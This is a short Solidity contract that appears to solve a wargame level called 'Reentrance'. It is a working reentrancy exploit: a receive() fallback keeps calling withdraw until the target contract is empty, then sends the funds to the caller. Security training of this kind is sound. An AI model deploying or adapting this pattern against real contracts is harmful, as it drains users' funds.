// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Reentrance } from "./Level10.sol";

contract L10Attack {
    Reentrance instance;
    uint256 value;

    constructor(Reentrance _instance) {
        instance = _instance;
    }

    function attack() external payable {
        value = msg.value;
        instance.donate{ value: value }(address(this));
        instance.withdraw(value);
        (bool success,) = payable(tx.origin).call{ value: address(this).balance }("");
        require(success, "Transfer failed.");
    }

    receive() external payable {
        if (address(instance).balance >= value) {
            instance.withdraw(value);
        }
    }
}
